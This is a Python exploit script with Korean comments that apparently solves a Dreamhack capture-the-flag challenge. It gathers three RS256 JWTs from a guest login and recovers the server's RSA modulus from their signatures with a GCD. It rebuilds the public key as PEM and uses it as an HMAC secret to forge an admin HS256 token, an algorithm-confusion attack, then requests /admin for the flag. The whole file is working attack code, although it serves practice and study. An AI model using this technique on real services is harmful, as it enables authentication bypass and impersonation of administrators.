import requests
import base64
import hashlib
import gmpy2
import hmac
import time
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

TARGET_URL = "http://host8.dreamhack.games:19422"

def get_token():
    s = requests.Session()
    r = s.post(f"{TARGET_URL}/login", data={"username": "guest", "password": "guest"})
    return s.cookies.get("token")

def parse_token(t):
    parts = t.split('.')
    msg = f"{parts[0]}.{parts[1]}".encode()
    sig_b64 = parts[2] + '=' * (4 - len(parts[2]) % 4)
    sig = int.from_bytes(base64.urlsafe_b64decode(sig_b64), 'big')
    return msg, sig

def get_pkcs1_v1_5_padding(msg_bytes):
    h = hashlib.sha256(msg_bytes).digest()
    asn1 = bytes.fromhex("3031300d060960864801650304020105000420")
    t = asn1 + h
    ps_len = 256 - len(t) - 3
    pad = b'\x00\x01' + (b'\xff' * ps_len) + b'\x00' + t
    return int.from_bytes(pad, 'big')

def main():
    attempt = 1
    while True:
        print(f"\n[===== 시도 {attempt} =====]")
        print("[*] 1. 서로 다른 토큰 3개 수집 중... (시간차를 두기 위해 약 3초 소요)")
        
        t1 = get_token()
        time.sleep(1.2)  # 초 단위 시간(iat)이 바뀌도록 1.2초 대기
        t2 = get_token()
        time.sleep(1.2)
        t3 = get_token()

        # 방어 로직: 혹시라도 토큰이 같으면 다시 수집
        if t1 == t2 or t2 == t3 or t1 == t3:
            print("[-] 토큰이 동일하게 수집되었습니다. 다시 시도합니다.")
            attempt += 1
            continue

        m1, s1 = parse_token(t1)
        m2, s2 = parse_token(t2)
        m3, s3 = parse_token(t3)

        p1 = get_pkcs1_v1_5_padding(m1)
        p2 = get_pkcs1_v1_5_padding(m2)
        p3 = get_pkcs1_v1_5_padding(m3)

        print("[*] 2. RSA 공개키(Modulus N) 복구 연산 중... 🚀")
        e = 65537
        
        s1_gmp, s2_gmp, s3_gmp = gmpy2.mpz(s1), gmpy2.mpz(s2), gmpy2.mpz(s3)
        p1_gmp, p2_gmp, p3_gmp = gmpy2.mpz(p1), gmpy2.mpz(p2), gmpy2.mpz(p3)

        val1 = (s1_gmp ** e) - p1_gmp
        val2 = (s2_gmp ** e) - p2_gmp
        val3 = (s3_gmp ** e) - p3_gmp

        N_gmp = gmpy2.gcd(val1, gmpy2.gcd(val2, val3))
        N = int(N_gmp)

        while N % 2 == 0: N //= 2
        for i in range(3, 1000, 2):
            while N % i == 0: N //= i

        if N.bit_length() != 2048:
            print(f"[-] 2048비트 모듈러스를 찾지 못했습니다 (현재: {N.bit_length()} 비트). 자동 재시도합니다.")
            attempt += 1
            continue

        print(f"[+] 성공! Modulus (N) 복구 완료: {hex(N)[:30]}...")

        print("[*] 3. 서버의 pub.crt와 동일한 PEM 형식 재구성 중...")
        public_numbers = rsa.RSAPublicNumbers(e, N)
        public_key = public_numbers.public_key()
        pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        print("[*] 4. HS256을 이용한 Admin JWT 위조 중...")
        header_b64 = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b'=')
        payload_b64 = base64.urlsafe_b64encode(b'{"username":"admin"}').rstrip(b'=')
        
        message = header_b64 + b"." + payload_b64
        
        signature = hmac.new(pem, message, hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=')
        
        forged_token = (message + b"." + sig_b64).decode()

        print("[*] 5. /admin 엔드포인트에 요청 전송 중...")
        r = requests.get(f"{TARGET_URL}/admin", cookies={"token": forged_token})
        
        print("\n" + "="*50)
        print(f"🎉 Flag: {r.text.strip()}")
        print("="*50)
        break  # 플래그를 찾으면 루프 종료

if __name__ == "__main__":
    main()